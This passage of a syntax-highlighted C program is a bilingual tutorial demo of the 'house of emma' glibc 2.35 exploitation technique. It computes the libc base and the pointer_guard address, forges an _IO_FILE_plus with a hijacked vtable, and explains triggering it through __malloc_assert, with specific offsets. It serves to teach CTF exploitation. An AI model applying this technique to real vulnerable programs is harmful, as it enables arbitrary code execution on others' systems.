class="type">char</span>* sh = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span>* flag = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line"><span class="type">size_t</span> space[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHello! today let&#x27;s learn something about house of emma.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m本程序用于演示house of emma的漏洞利用原理。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31mTested in Ubuntu 22.04, glibc version: Ubuntu GLIBC 2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[1;31m测试环境：Ubuntu 22.04，glibc版本为2.35-0ubuntu3.1\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mHouse of emma is used for high version of glibc, it utilizes _IO_FILE struct to exploit.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mhouse of emma 适用于高版本glibc，它使用_IO_FILE结构体进行漏洞利用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSame as other way of exploitation with _IO_FILE, it also use fake _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m与其他利用_IO_FILE结构体漏洞的方法相同，它也利用了伪造的_IO_FILE结构体。\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt can be triggered by function __malloc_assert, so it always go with heap vulnerabilities.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m它可以通过函数__malloc_assert触发，因此它常常与堆漏洞相联系。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mFirst we need to know the structure of _IO_FILE in glibc 2.35:\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[32m首先我们需要了解一下glibc 2.35版本下_IO_FILE结构体的内容：\n\033[0m&quot;</span></span><br><span class="line">         <span class="string">&quot;\033[33m(line 49, /libio/bits/types/struct_FILE.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstruct _IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;;\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe key element we need to forge is the *vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m其中的关键就是*vtable指针。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that we need to write correct *_lock value in our fake _IO_FILE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m值得注意的是，我们需要写入正确的*_lock指针值到伪造的_IO_FILE结构体中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe value of *_lock should be \033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m*_lock的值应该是\033[31m_IO_stdfile_1_lock.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that we need to know the loading base address of libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以我们需要知道libc的加载基地址。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35mNow let&#x27;s get loading base address of libc through the address of function puts().\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35m现在让我们通过puts()函数获取一下libc的加载基地址。\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">int</span>(*func)(<span class="type">const</span> <span class="type">char</span>*)  = puts;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of function puts() is: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mputs函数的地址为: \033[31m%p\n\033[0m&quot;</span>, func);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSo that the loading address of libc is: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m因此libc的加载地址为: \033[31m%p\n\033[0m&quot;</span>, func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(The offset address of function puts() is 0x80ed0)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(puts函数的偏移量为0x80ed0)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)(func - <span class="number">0x80ed0</span>);</span><br><span class="line">    <span class="type">size_t</span> stderr_ptr = (<span class="type">size_t</span>)(libc_base + <span class="number">0x21a860</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mSince we know the libc base address, we can also know the address of pointer stderr: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m既然现在我们已经知道了libc的加载地址，我们也可以获得stderr指针的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">void</span>*)stderr_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNow let&#x27;s satisfy the second prerequisite of the exploit: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m下面让我们构造一下这个漏洞利用的第二个前提条件: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33mGet the value of pointer_guard or change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m获取到pointer_guard的值并将其修改为一个已知值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOur house of emma has a stable call chain, and we&#x27;ll need the value to guide rip to the function we want.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们的house of emma利用方式有一条完整的函数调用链，我们需要这个pointer_guard的值来引导rip到我们想要的函数。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhere the value is used will be introduced later.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们之后将会介绍这个pointer_guard的地址在什么地方。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIt&#x27;s worth noticing that\033[31m the value of pointer guard is not located in libc, while before libc.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m需要注意的是pointer guard的值并不在libc中，而是在libc的低地址处。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIf you use pwndbg, you can see that before libc, there exists an anonymous space, with its size of 0x3000.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m如果使用pwndbg，你可以看到在libc前面有一个匿名的内存区域，大小为0x3000。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe tls struct is located in this anonymous area, which includes the value of pointer_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mtls结构体就位于这个匿名的内存空间中，它包含有pointer_guard。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mTo be more detail, the value of pointer_guard is located in (libc_base - 0x3000 + 0x770)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m更具体地说，pointer_guard的值应该位于(libc_base - 0x3000 + 0x770)\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mActually, the name of the struct is \033[31mtcbhead_t\033[32m. Here is the structure:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m实际上，这个结构体的名字是\033[31mtcbhead_t\033[32m. 下面是它的构造:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 36, /sysdeps/x86_64/nptl/tls.h)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mtypedef struct\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *tcb;\t\t/* Pointer to the TCB.  Not necessarily the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t\t   thread descriptor used by libpthread.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  dtv_t *dtv;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *self;\t\t/* Pointer to the thread descriptor.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int multiple_threads;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int gscope_flag;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t sysinfo;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t stack_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  uintptr_t pointer_guard;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long int unused_vgetcpu_cache[2];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Bit 0: X86_FEATURE_1_IBT.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     Bit 1: X86_FEATURE_1_SHSTK.\n&quot;</span></span><br><span class="line">         <span class="string">&quot;   */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned int feature_1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  int __glibc_unused1;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Reservation of some values for the TM ABI.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_tm[4];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* GCC split stack support.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__private_ss;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* The lowest address of shadow stack,  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  unsigned long long int ssp_base;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  /* Must be kept even if it is no longer used by glibc since programs,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;     like AddressSanitizer, depend on the size of tcbhead_t.  */\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  void *__padding[8];\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125; tcbhead_t;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe can see that the stack guard is right above the pointer guard, so we can&#x27;t absolutely change the stack_guard.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们可以发现stack_guard就在pointer_guard的上面，因此我们绝对不能修改stack_guard的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mLet&#x27;s calculate the address of pointer_guard: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m让我们计算一下pointer_guard的地址: \033[31m%p\033[0m\n&quot;</span>, (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* pointer_guard_address = (<span class="type">size_t</span>*)(libc_base - <span class="number">0x3000</span> + <span class="number">0x770</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of pointer_guard is: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mpointer_guard的值为: \033[31m%#zx\033[0m\n&quot;</span>, *pointer_guard_address);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn CTF problems you can&#x27;t always get the original value of pointer_guard, but you can also change it to a known value.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF赛题中你可能不能获取到pointer_guard的值，但你可以将其改写为一个已知值。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mOK, now we can try to forge a _IO_FILE struct.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m那么现在我们就来开始伪造_IO_FILE结构体。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mAttention: what we forge is actually _IO_FILE_plus struct, which contains a _IO_FILE struct and a vtable pointer(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m注意：我们伪造的实际上是_IO_FILE_plus结构体，其包含_IO_FILE结构体的所有内容以及一个vtable指针(_IO_jump_t*)\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span>* fake_file_struct = (<span class="keyword">struct</span> _IO_FILE*)<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span>* vtable = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="built_in">sizeof</span> (<span class="keyword">struct</span> _IO_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mWe just allocate a fake _IO_FILE_plus struct into the heap: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m我们刚刚分配了一个假的_IO_FILE_plus结构体到堆: \033[31m%p\033[m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of fake _IO_FILE_plus is: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m这个假的_IO_FILE_plus结构体的地址为: \033[31m%p\033[0m\n&quot;</span>, fake_file_struct);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe address of vtable pointer is: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mvtable指针的地址为: \033[31m%p\033[0m\n&quot;</span>, vtable);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we are going to change the value of _lock and vtable pointer.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们来修改_lock和vtable指针的值。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe _lock should be changed into \033[31m_IO_stdfile_1_lock\033[32m, which is in \033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m_lock的值应该被修改为\033[31m_IO_stdfile_1_lock\033[32m, 它的地址为\033[31m(libc_base + 0x21ba70).\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe vtable should be changed into \033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;which points to function \033[31m_IO_file_xsputn.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mvtable指针应该被修改为\033[31m(_IO_cookie_jumps + 0x38)\033[32m, &quot;</span></span><br><span class="line">         <span class="string">&quot;其指向函数\033[31m_IO_file_xsputn.\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;_lock = \033[33m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    fake_file_struct-&gt;_lock = (<span class="type">void</span> *) (libc_base + <span class="number">0x21ba70</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;_lock = \033[31m%p\033[0m\n\n&quot;</span>, fake_file_struct-&gt;_lock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mBefore alteration: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改前: fake_file_struct-&gt;vtable = \033[33m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    *vtable = (<span class="type">size_t</span>)(libc_base + <span class="number">0x215b80</span> + <span class="number">0x38</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mAfter alteration: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n&quot;</span>, *vtable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m修改后: fake_file_struct-&gt;vtable = \033[31m%#zx\033[0m\n\n&quot;</span>, *vtable);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* top_chunk_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)fake_file_struct + <span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThrough pwndbg, we can see that the size of top chunk is at fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m通过pwndbg我们可以看到top chunk的大小保存在fake_file_struct + 0x108 = %p\033[0m\n&quot;</span>, top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mThe value of top_chunk-&gt;size is: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32mtop chunk的大小top_chunk-&gt;size为: %#zx\033[0m\n&quot;</span>, *top_chunk_size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function sysmalloc, there is a check for page alignment of top chunk: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在函数sysmalloc中，有一个检查top chunk页对齐的代码片段: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 2617, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||\n&quot;</span></span><br><span class="line">         <span class="string">&quot;          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           prev_inuse (old_top) &amp;&amp;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe function assert here in malloc.c is a bit different from that in other file.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这个malloc.c中的assert函数与其他文件中的函数不太一样。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBecause in malloc.c there is a #define statement: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因为在malloc.c中有一个#define语句: \n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 292, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m# define __assert_fail(assertion, file, line, function)\t\t\t\\\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t __malloc_assert(assertion, file, line, function)\n\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo that if the assertion in malloc.c failed, it will call function __malloc_assert.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m所以如果这个检查失败了，那么它就会调用__malloc_assert.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe content of function __malloc_assert is: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__malloc_assert函数的内容为: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[33m(line 297, /malloc/malloc.c)\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34mstatic void\n&quot;</span></span><br><span class="line">         <span class="string">&quot;__malloc_assert (const char *assertion, const char *file, unsigned int line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t const char *function)\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  (void) __fxprintf (NULL, \&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     __progname, __progname[0] ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     file, line,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     function ? function : \&quot;\&quot;, function ? \&quot;: \&quot; : \&quot;\&quot;,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\t\t     assertion);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  fflush (stderr);\n&quot;</span></span><br><span class="line">         <span class="string">&quot;  abort ();\n&quot;</span></span><br><span class="line">         <span class="string">&quot;&#125;\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWhile in function __fxprintf, it will utilize stderr to output something, and that is our chance.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m函数__fxprintf会利用stderr来输出错误信息，这就是我们利用的机会。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThrough forging fake _IO_FILE struct, we can turn to anywhere that can be executed.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m通过伪造_IO_FILE结构体，我们可以执行任意地址的代码。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe easiest way in CTF is turning the execution flow into one gadget.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m在CTF比赛中最简单的方法就是将执行流转到one_gadget中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mBut one gadgets in libc 2.35 all have many constraints, which we need to pay attention to.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m但glibc 2.35版本的one gadget有很多的限制条件需要注意。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mMoreover, many problems today have sandboxes, where you cannot use the syscall EXECVE.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m另外，现在的很多赛题都有沙箱，我们可能不能调用execve的系统调用。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mSo stack pivoting may be the most common step in exploitation.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m因此栈迁移就是本方法利用中较为常用的手段了。\n\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mIn function __vxprintf_internal, which is called indirectly by __fxprintf, it will call function _IO_cookie_read: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m__fxprintf函数会间接调用到__vxprintf_internal函数，后者会调用_IO_cookie_read函数: \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m&lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe 